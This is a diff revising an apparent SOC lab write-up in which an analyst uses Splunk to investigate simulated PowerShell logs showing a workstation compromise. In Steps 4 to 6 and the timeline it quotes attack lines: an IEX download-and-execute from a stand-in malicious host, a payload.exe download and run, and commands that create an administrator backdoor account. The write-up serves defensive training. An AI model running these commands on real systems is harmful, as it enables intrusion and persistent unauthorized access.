@@ -1,29 +1,31 @@
+# Case 02 — Suspicious PowerShell Activity Detection
+
 ## Executive Summary
-A sophisticated PowerShell-based attack was detected on workstation WKSTN-04 
-at SecureCore Ltd. The attacker used encoded commands to hide malicious 
-activity, created a hidden administrator backdoor account, downloaded and 
-executed malware from an external server, and conducted post-exploitation 
-reconnaissance — representing a critical severity incident with potential 
-for full network compromise.
+An attacker used PowerShell to compromise workstation WKSTN-04 at SecureCore 
+Ltd. They hid their commands using encoding to avoid detection, created a 
+secret administrator account to maintain access, downloaded malware from an 
+external server, ran it, and then started mapping out the internal network. 
+This was a structured and deliberate attack that went undetected because 
+there was no PowerShell monitoring in place.
 
 ---
 
 ## Scenario
-It is Wednesday morning at SecureCore Ltd. The SIEM fires an alert — 
-"Suspicious PowerShell execution detected on workstation WKSTN-04." The 
-alert shows PowerShell was launched with encoded parameters from an unusual 
-parent process. A SOC analyst is tasked with investigating whether this is 
-a legitimate administrator running a script or an attacker using PowerShell 
-to compromise the system.
+It is Wednesday morning at SecureCore Ltd. The SIEM fires an alert about 
+suspicious PowerShell activity on workstation WKSTN-04. The alert shows 
+PowerShell was launched with unusual parameters from a process it normally 
+would not come from. As the analyst on duty the task is to investigate 
+whether this is a legitimate administrator running a script or an attacker 
+using PowerShell to compromise the machine.
 
-The analyst has access to Windows PowerShell execution logs ingested into 
-Splunk and must identify all malicious commands, determine the full scope 
-of the attack, and document findings professionally.
+The investigation uses Windows PowerShell execution logs loaded into Splunk 
+to identify every malicious command, understand what the attacker did, and 
+document the full scope of the compromise.
 
 ## Objective
-Investigate suspicious PowerShell execution logs using Splunk, identify 
-malicious commands and techniques, determine the full scope of the attack, 
-and document all findings professionally.
+Use Splunk to investigate suspicious PowerShell execution, identify all 
+malicious commands and techniques used, understand the full scope of the 
+attack, and produce a clear professional report of the findings.
 
 ## Tools Used
 - Splunk Enterprise
@@ -33,113 +35,93 @@ and document all findings professionally.
 - File: powershell-logs.csv
 - Index: main
 - Total Events: 16
-- Log Fields: time, host, user, src_ip, process, parent_process, 
+- Log Fields: time, host, user, src_ip, process, parent_process,
   command_line, encoded, EventCode, status, description
 
 ---
 
-## Background — Why Attackers Abuse PowerShell
+## Background — Why Attackers Use PowerShell
+PowerShell is built into every Windows machine and is trusted by the 
+operating system. That is exactly why attackers love it. They do not 
+need to bring any external tools because everything they need is already 
+there. They can download files, run code, create accounts and explore 
+the network all through PowerShell without triggering most antivirus tools.
 
-PowerShell is a legitimate Windows administration tool pre-installed on 
-every Windows machine. Attackers abuse it because:
+The biggest warning signs to watch for in PowerShell investigations:
 
-- It is already trusted by the operating system
-- It can download files, execute code and manage systems
-- Commands can be encoded in Base64 to hide their true purpose
-- Activity can blend in with legitimate administrator behaviour
-
-**Key red flags in PowerShell investigations:**
-
-| Red Flag | What it means |
-|----------|--------------|
-| Parent process is cmd.exe | Someone used command prompt to launch PowerShell — unusual for normal users |
-| encoded=true | Command was deliberately scrambled to hide its purpose |
-| Invoke-WebRequest | PowerShell downloading something from the internet |
-| New-LocalUser | A new user account being created |
-| Add-LocalGroupMember | Adding a user to a privileged group |
+| Warning Sign | What it means |
+|-------------|---------------|
+| Parent process is cmd.exe | Someone opened a command prompt first and used it to launch PowerShell which is unusual for normal users |
+| encoded is true | The command was deliberately scrambled so you cannot read what it does |
+| Invoke-WebRequest | PowerShell is downloading something from the internet |
+| New-LocalUser | A new user account is being created |
+| Add-LocalGroupMember | Someone is being added to a privileged group |
 
 ---
 
 ## Investigation Steps
 
 ### Step 1 — Load and Review Raw Logs
-The dataset was loaded into Splunk and raw logs were reviewed first to 
-understand the full scope of PowerShell activity across the environment.
 
 **Query used:**
 ```
 index=main source="powershell-logs.csv"
 ```
 
-**Why this query:**
-Always begin with raw unfiltered data. This establishes your baseline — 
-understanding what normal PowerShell activity looks like in this 
-environment before identifying what is abnormal.
+**What this does and why:**
+This pulls the full dataset without any filtering. Before hunting for 
+anything specific it is important to understand the environment first. 
+What does normal PowerShell activity look like here? Once you know that, 
+anything that does not fit becomes much easier to spot.
 
-**What to look for:**
-Total event count, which workstations are involved, which users are 
-running PowerShell, and whether any fields immediately stand out such 
-as encoded or parent_process.
+The key fields to pay attention to at this stage are the parent process 
+column and the encoded column. These two alone can tell you a lot about 
+whether something is suspicious before you even read the command itself.
 
-**Finding:**
-16 total PowerShell events were present. Initial review revealed activity 
-across multiple workstations — WKSTN-01, WKSTN-02, WKSTN-03 and WKSTN-04. 
-Most activity appeared normal but WKSTN-04 immediately stood out due to 
-its parent process and encoded command fields.
+**What was found:**
+16 total events across multiple workstations. Most of the activity looked 
+normal at first glance but WKSTN-04 immediately stood out. Its parent 
+process and encoded field values were different from every other machine 
+in the dataset. The screenshot below shows the full raw dataset as it 
+appeared in Splunk.
 
-![Figure 1 — Raw log overview showing 16 PowerShell events across 
-multiple workstations](screenshots/01-raw-logs.png)
-
-**Figure 1** confirms the dataset was successfully loaded with all fields 
-correctly parsed. The variety of workstations and users provides important 
-baseline context for identifying anomalies.
+![Raw log overview showing 16 PowerShell events across multiple 
+workstations](screenshots/01-raw-logs.png)
 
 ---
 
 ### Step 2 — Full Dataset Overview
-All events were organised into a clean structured table to compare 
-normal versus suspicious PowerShell activity across the environment.
 
 **Query used:**
 ```
 index=main source="powershell-logs.csv"
-| table time, user, extracted_host, parent_process, command_line, 
+| table time, user, extracted_host, parent_process, command_line,
   encoded, status, description
 | sort time
 ```
 
-**Why this query:**
-The `table` command presents all key fields side by side making it easy 
-to compare activity across workstations. Including the `encoded` and 
-`parent_process` fields in the table immediately highlights anomalies 
-that would otherwise require multiple separate queries to find.
+**What this does and why:**
+Putting all the key fields into one clean table makes it much easier to 
+compare activity across workstations side by side. Including the encoded 
+and parent process fields in the same view means you can spot the 
+difference between normal and suspicious activity without running 
+separate queries for each.
 
-**What pattern to expect:**
-Normal PowerShell activity shows explorer.exe as the parent process with 
-readable command lines and encoded=false. Malicious activity shows 
-cmd.exe as the parent with encoded=true and suspicious command lines.
+**What was found:**
+The table made the contrast obvious straight away. WKSTN-01, WKSTN-02 
+and WKSTN-03 all showed PowerShell launched from explorer.exe with 
+normal readable commands. WKSTN-04 was completely different. Every 
+single event on that machine showed cmd.exe as the parent process and 
+several commands were encoded. The screenshot below shows this contrast 
+clearly across all machines.
 
-**Finding:**
-The table immediately revealed a clear split between normal and suspicious 
-activity. WKSTN-01, WKSTN-02 and WKSTN-03 showed PowerShell launched from 
-explorer.exe with readable commands — normal behaviour. WKSTN-04 showed 
-PowerShell launched exclusively from cmd.exe with encoded commands and 
-highly suspicious activity — a clear anomaly requiring immediate 
-investigation.
-
-![Figure 2 — Full dataset table showing normal activity on other 
-workstations contrasted against suspicious cmd.exe launched encoded 
-commands on WKSTN-04](screenshots/02-full-table-overview.png)
-
-**Figure 2** makes the contrast between normal and malicious PowerShell 
-activity immediately visible. Every suspicious event is concentrated on 
-WKSTN-04 with cmd.exe as the parent process.
+![Full dataset table showing normal activity on other workstations 
+versus suspicious cmd.exe launched encoded commands on 
+WKSTN-04](screenshots/02-full-table-overview.png)
 
 ---
 
 ### Step 3 — Isolate WKSTN-04 Activity
-All activity on the compromised workstation was isolated to reconstruct 
-the complete attack sequence in chronological order.
 
 **Query used:**
 ```
@@ -148,80 +130,65 @@ index=main source="powershell-logs.csv" extracted_host=WKSTN-04
 | sort time
 ```
 
-**Why this query:**
-Filtering by a specific host isolates all activity on that machine 
-regardless of other filter criteria. Sorting by time reconstructs the 
-exact sequence of events — critical for understanding how the attack 
-progressed from initial access through to post-exploitation.
+**What this does and why:**
+Filtering to just WKSTN-04 and sorting by time lets you read the attack 
+as a story from beginning to end. When you look at the commands in order 
+you can see exactly how the attacker moved from one stage of the attack 
+to the next. This is how you reconstruct what happened rather than just 
+seeing individual events in isolation.
 
-**What pattern to expect:**
-A structured attack follows a clear lifecycle — initial access, execution, 
-persistence, then reconnaissance. The commands should tell a coherent 
-story when read in chronological order.
+**What was found:**
+10 events on WKSTN-04 between 09:20 and 09:45, all run by the admin 
+account, all launched from cmd.exe. Reading them in order told a very 
+clear story. The attacker started with encoded commands to hide their 
+initial activity, then created a backdoor account, then downloaded and 
+ran malware, then started exploring the system. The screenshot below 
+shows the complete sequence of events on WKSTN-04.
 
-**Finding:**
-10 PowerShell events were recorded on WKSTN-04 between 09:20 and 09:45. 
-All events were executed by the admin account with cmd.exe as the parent 
-process. Reading the commands chronologically revealed a structured and 
-deliberate attack following the classic attack lifecycle.
-
-![Figure 3 — Complete WKSTN-04 activity timeline showing 10 events 
-from encoded command execution through to post-exploitation 
+![Complete WKSTN-04 activity timeline showing 10 events from encoded 
+command execution through to post-exploitation 
 reconnaissance](screenshots/03-wkstn04-full-activity.png)
-
-**Figure 3** shows the complete attack sequence on WKSTN-04 in 
-chronological order. The progression from encoded commands to backdoor 
-creation to malware execution is clearly visible.
 
 ---
 
 ### Step 4 — Detect Encoded PowerShell Commands
-Encoded PowerShell commands were isolated to identify deliberate attempts 
-to hide malicious activity from security monitoring tools.
 
 **Query used:**
 ```
 index=main source="powershell-logs.csv" encoded=true
-| table time, user, extracted_host, parent_process, command_line, 
+| table time, user, extracted_host, parent_process, command_line,
   description
 | sort time
 ```
 
-**Why this query:**
-Filtering `encoded=true` specifically targets commands that were 
-deliberately obfuscated. Legitimate administrators very rarely need to 
-encode PowerShell commands — encoded commands in an environment are 
-almost always malicious. This query is a high-fidelity detection rule 
-used in real SOC environments.
+**What this does and why:**
+Filtering specifically for encoded commands targets the most suspicious 
+behaviour in the dataset. Legitimate administrators almost never need 
+to encode their PowerShell commands. When you see encoding it usually 
+means someone is deliberately trying to hide what they are doing from 
+security tools and analysts. This type of query is commonly used as 
+a detection rule in real SOC environments.
 
-**What pattern to expect:**
-Encoded commands appear as long strings of random-looking characters. 
-Multiple encoded commands in quick succession suggest an automated 
-attack tool running a payload delivery sequence.
-
-**Finding:**
-3 encoded PowerShell commands were executed on WKSTN-04 between 09:20 
-and 09:22 — all from cmd.exe. The encoded strings translate to:
+**What was found:**
+Three encoded commands were executed on WKSTN-04 within two minutes 
+between 09:20 and 09:22, all from cmd.exe. When decoded those strings 
+translate to this:
 ```
 IEX (New-Object Net.WebClient).DownloadString('http://malicious.site/payload')
 ```
 
-This command downloads malicious code from a remote server and executes 
-it directly in memory — a fileless attack technique designed to evade 
-antivirus detection.
+That command downloads malicious code from an external server and runs 
+it directly in memory without saving a file first. This technique is 
+designed to avoid antivirus detection because there is no file on disk 
+to scan. The screenshot below shows the three encoded commands as they 
+appeared in Splunk.
 
-![Figure 4 — Three encoded PowerShell commands executed in quick 
-succession from cmd.exe on WKSTN-04](screenshots/04-encoded-commands.png)
-
-**Figure 4** confirms that 3 deliberately obfuscated commands were 
-executed within 2 minutes — consistent with an automated payload 
-delivery tool rather than manual administrator activity.
+![Three encoded PowerShell commands executed within two minutes from 
+cmd.exe on WKSTN-04](screenshots/04-encoded-commands.png)
 
 ---
 
 ### Step 5 — Backdoor Account Creation
-Commands containing backdoor-related activity were isolated to identify 
-persistence mechanisms established by the attacker.
 
 **Query used:**
 ```
@@ -230,41 +197,33 @@ index=main source="powershell-logs.csv" command_line="*backdoor*"
 | sort time
 ```
 
-**Why this query:**
-The `*` wildcard matches any text before or after the search term — so 
-this finds any command containing the word backdoor regardless of the 
-full command structure. Persistence detection is critical because it 
-determines whether the attacker can return even after remediation.
+**What this does and why:**
+Using a wildcard search for the word backdoor finds any command that 
+references it regardless of the full command structure. This is important 
+because persistence detection is one of the most critical parts of any 
+investigation. If the attacker has created a way to get back in then 
+simply resetting passwords is not enough to fix the problem.
 
-**What pattern to expect:**
-Attackers typically create a new account and immediately elevate its 
-privileges in two sequential commands — account creation followed by 
-group membership addition.
+**What was found:**
+Two commands showed up back to back:
 
-**Finding:**
-Two critical persistence commands were identified:
+| Time | Command | What it did |
+|------|---------|-------------|
+| 09:23 | New-LocalUser -Name backdoor -Password P@ssw0rd123 | Created a hidden local account |
+| 09:25 | Add-LocalGroupMember -Group Administrators -Member backdoor | Gave that account full admin rights |
 
-| Time | Command | Purpose |
-|------|---------|---------|
-| 09:23 | New-LocalUser -Name backdoor -Password P@ssw0rd123 | Hidden local account created |
-| 09:25 | Add-LocalGroupMember -Group Administrators -Member backdoor | Full admin privileges granted |
+The attacker created a secret account called backdoor and immediately 
+gave it administrator privileges. Even if the security team caught the 
+attack and reset the admin password the attacker could still log back 
+in through this hidden account. The screenshot below shows both commands 
+and their timestamps.
 
-The attacker created a hidden account named "backdoor" and immediately 
-elevated it to administrator level. This ensures continued access even 
-if the original compromise is discovered and the admin password is reset.
-
-![Figure 5 — Backdoor account creation and privilege escalation commands 
-executed at 09:23 and 09:25](screenshots/05-backdoor-creation.png)
-
-**Figure 5** confirms the two-step persistence mechanism — account 
-creation immediately followed by administrator privilege assignment — 
-a classic attacker persistence technique.
+![Backdoor account creation and privilege escalation commands at 09:23 
+and 09:25](screenshots/05-backdoor-creation.png)
 
 ---
 
 ### Step 6 — Malware Download and Execution
-Commands involving the malicious payload were isolated to confirm malware 
-deployment on the compromised system.
 
 **Query used:**
 ```
@@ -273,52 +232,45 @@ index=main source="powershell-logs.csv" command_line="*payload.exe*"
 | sort time
 ```
 
-**Why this query:**
-Searching for the payload filename identifies both the download and 
-execution events in one query. This confirms the full malware deployment 
-cycle — download, save and execute — proving the system is actively 
-compromised rather than just targeted.
+**What this does and why:**
+Searching for the payload filename finds both the download and execution 
+events together in one result. This confirms the complete malware 
+deployment cycle and proves the system is actively compromised rather 
+than just targeted. The save location in the command also reveals 
+something about how the attacker works.
 
-**What pattern to expect:**
-Malware deployment follows a two-step pattern — first a download command 
-saves the file to disk, then an execution command launches it. The save 
-location often reveals attacker tradecraft.
+**What was found:**
 
-**Finding:**
+| Time | Command | What it did |
+|------|---------|-------------|
+| 09:27 | Invoke-WebRequest -Uri http://malicious.site/payload.exe -OutFile C:\Windows\Temp\payload.exe | Downloaded malware from external server |
+| 09:30 | Start-Process C:\Windows\Temp\payload.exe | Ran the malware |
 
-| Time | Command | Action |
-|------|---------|--------|
-| 09:27 | Invoke-WebRequest -Uri http://malicious.site/payload.exe -OutFile C:\Windows\Temp\payload.exe | Malware downloaded |
-| 09:30 | Start-Process C:\Windows\Temp\payload.exe | Malware executed |
+The attacker saved the file to C:\Windows\Temp which is a folder that 
+all users can write to and that many security tools tend to ignore. 
+This is a deliberate choice. Once the file was saved it was immediately 
+executed confirming the machine was fully compromised. The screenshot 
+below shows both events.
 
-The attacker saved the malware to C:\Windows\Temp\ — a classic technique 
-as this folder is writable by all users and frequently overlooked by 
-security tools. The malware was then executed confirming full compromise 
-of WKSTN-04.
-
-![Figure 6 — Malware download from external server and execution 
-confirmed at 09:27 and 09:30](screenshots/06-malware-download-execution.png)
-
-**Figure 6** confirms the complete malware deployment cycle — download 
-from an external malicious server followed by local execution. The 
-C:\Windows\Temp\ save location indicates deliberate attacker tradecraft.
+![Malware downloaded from external server at 09:27 and executed at 
+09:30](screenshots/06-malware-download-execution.png)
 
 ---
 
-## Attack Timeline
+## 🕒 Attack Timeline
 
-| Time | Event |
-|------|-------|
-| 09:20:00 | First encoded PowerShell command executed via cmd.exe |
-| 09:21:00 | Second encoded command executed |
-| 09:22:00 | Third encoded command executed |
+| Time | What happened |
+|------|--------------|
+| 09:20:00 | First encoded PowerShell command runs via cmd.exe |
+| 09:21:00 | Second encoded command runs |
+| 09:22:00 | Third encoded command runs |
 | 09:23:00 | ⚠️ Backdoor user account created |
-| 09:25:00 | ⚠️ Backdoor account added to Administrators group |
+| 09:25:00 | ⚠️ Backdoor account given administrator privileges |
 | 09:27:00 | ⚠️ Malware downloaded from http://malicious.site/payload.exe |
-| 09:30:00 | ⚠️ Malware executed from C:\Windows\Temp\ |
-| 09:35:00 | Attacker enumerates local users |
-| 09:40:00 | Attacker maps network configuration |
-| 09:45:00 | Attacker enumerates running processes |
+| 09:30:00 | ⚠️ Malware executed from C:\Windows\Temp |
+| 09:35:00 | Attacker lists all local user accounts |
+| 09:40:00 | Attacker checks network configuration |
+| 09:45:00 | Attacker lists running processes |
 
 ---
 
@@ -331,60 +283,85 @@ C:\Windows\Temp\ save location indicates deliberate attacker tradecraft.
 | Attack start time | 2026-04-08 09:20:00 |
 | Entry technique | Encoded PowerShell via cmd.exe |
 | Encoded commands executed | 3 |
-| Backdoor account created | "backdoor" |
+| Backdoor account created | backdoor |
 | Backdoor privileges | Administrator |
 | Malware source | http://malicious.site/payload.exe |
 | Malware saved to | C:\Windows\Temp\payload.exe |
 | Malware executed | Confirmed at 09:30 |
-| Post-exploitation | User enumeration, network recon, process enumeration |
-| Weakness exploited | No PowerShell execution restrictions or monitoring |
+| Post-exploitation activity | User enumeration, network recon, process enumeration |
+| Weakness exploited | No PowerShell monitoring or execution restrictions |
+| Severity | Critical |
 
 ---
 
 ## MITRE ATT&CK Mapping
 
-| Technique | ID | Explanation |
-|-----------|-----|-------------|
-| PowerShell | T1059.001 | The attacker used PowerShell as their primary attack tool — abusing a legitimate Windows feature to avoid detection |
-| Obfuscated Files or Information | T1027 | Commands were Base64 encoded to hide their true purpose from security tools and analysts |
-| Create Local Account | T1136.001 | A hidden local account named "backdoor" was created to maintain persistent access even after the initial compromise is discovered |
-| Ingress Tool Transfer | T1105 | Malware was downloaded from an external server using Invoke-WebRequest — a built-in PowerShell tool |
-| System Information Discovery | T1082 | After deploying malware the attacker enumerated users, network configuration and running processes to understand the environment |
-| Process Injection via cmd.exe | T1059.003 | PowerShell was launched from cmd.exe rather than directly — a process chaining technique used to obscure the attack origin |
+| Technique | ID | What was observed |
+|-----------|-----|------------------|
+| PowerShell | T1059.001 | PowerShell was used as the main attack tool throughout the entire compromise because it is trusted by Windows and harder to detect than external tools |
+| Obfuscated Files or Information | T1027 | Three commands were Base64 encoded specifically to hide what they were doing from security monitoring tools and analysts reviewing logs |
+| Create Local Account | T1136.001 | A hidden local account named backdoor was created to ensure the attacker could return even if the original compromise was discovered and the admin password was changed |
+| Ingress Tool Transfer | T1105 | Malware was downloaded from an external server using Invoke-WebRequest which is a built-in PowerShell tool making it harder to block |
+| System Information Discovery | T1082 | After deploying the malware the attacker spent time listing users, checking network settings and reviewing running processes to understand the environment before the next stage |
+| Command and Scripting Interpreter | T1059.003 | PowerShell was launched from cmd.exe rather than directly which is a technique used to make the origin of the attack less obvious in logs |
 
 ---
 
 ## Conclusion
-This investigation confirmed a sophisticated and structured PowerShell-based 
-attack against WKSTN-04 at SecureCore Ltd. The attacker demonstrated 
-advanced tradecraft — using encoded commands to bypass security monitoring, 
-launching PowerShell from cmd.exe to obscure the attack origin, and saving 
-malware to C:\Windows\Temp\ to evade detection.
+This was a well planned attack that used legitimate Windows tools to avoid 
+detection at every stage. The attacker never needed to bring anything 
+external onto the machine because PowerShell gave them everything they 
+needed.
 
-The attack followed a deliberate lifecycle — initial access via encoded 
-commands, persistence through a hidden administrator account, malware 
-deployment from an external server, and post-exploitation reconnaissance 
-to prepare for further network penetration.
+The encoding of the initial commands was the clearest sign of intent. 
+Normal administrators do not encode their scripts. The fact that three 
+encoded commands ran back to back from cmd.exe with no monitoring alert 
+firing shows that the environment had no visibility into PowerShell 
+activity at all.
 
-The primary weakness exploited was the absence of PowerShell execution 
-restrictions and monitoring. Had PowerShell script block logging been 
-enabled, the encoded commands would have been automatically decoded and 
-logged — making detection immediate rather than requiring manual 
-investigation.
+What made this particularly dangerous was the backdoor account. Even if 
+the security team had caught the malware and cleaned the machine, the 
+backdoor account would have given the attacker a way back in. Finding 
+and removing persistence mechanisms is just as important as removing 
+the malware itself.
 
-The creation of a backdoor administrator account means that simply 
-resetting the admin password is insufficient for remediation — the 
-backdoor account must be identified and removed or the attacker retains 
-persistent access regardless of other remediation steps.
+The post-exploitation activity at the end showed the attacker was not 
+done. Listing users, checking the network and reviewing running processes 
+are the steps an attacker takes when they are planning to move further 
+into the environment. This machine was likely going to be used as a 
+stepping stone for a broader attack.
+
+This needs to be treated as an active compromise. The machine should be 
+isolated immediately and a full forensic investigation carried out before 
+it is returned to service.
+
+---
+
+## 🔑 Key Takeaways
+
+- Encoding a PowerShell command is almost always a red flag. 
+  Legitimate admins rarely need to do it
+- Launching PowerShell from cmd.exe is unusual and worth investigating 
+  every time you see it
+- Creating a backdoor account means resetting passwords alone will not 
+  fix the problem. You need to find and remove every persistence mechanism
+- Saving files to C:\Windows\Temp is a common attacker technique because 
+  the folder is writable and often ignored by security tools
+- The post-exploitation commands showed the attacker was preparing for 
+  more. Catching this early prevented a larger breach
+- No PowerShell monitoring meant this attack ran for 25 minutes completely 
+  undetected. Script block logging would have caught the encoded commands 
+  immediately
+
+---
 
 ## Recommended Actions
-- Immediately isolate WKSTN-04 from the network
-- Disable and delete the backdoor local account immediately
-- Block http://malicious.site at the firewall level
-- Search all other machines for payload.exe in C:\Windows\Temp\
-- Reset admin account credentials across all systems
-- Enable PowerShell script block logging across the entire environment
-- Implement Constrained Language Mode for PowerShell
-- Create SIEM alert for any encoded PowerShell execution
-- Create SIEM alert for PowerShell launched from cmd.exe
-- Conduct full forensic investigation of WKSTN-04
+- Isolate WKSTN-04 from the network immediately
+- Delete the backdoor local account
+- Block http://malicious.site at the firewall
+- Search every other machine for payload.exe in C:\Windows\Temp
+- Reset admin credentials across all systems
+- Enable PowerShell script block logging across the environment
+- Set up a SIEM alert for any encoded PowerShell execution
+- Set up a SIEM alert for PowerShell launched from cmd.exe
+- Run a full forensic review of WKSTN-04 before returning it to service
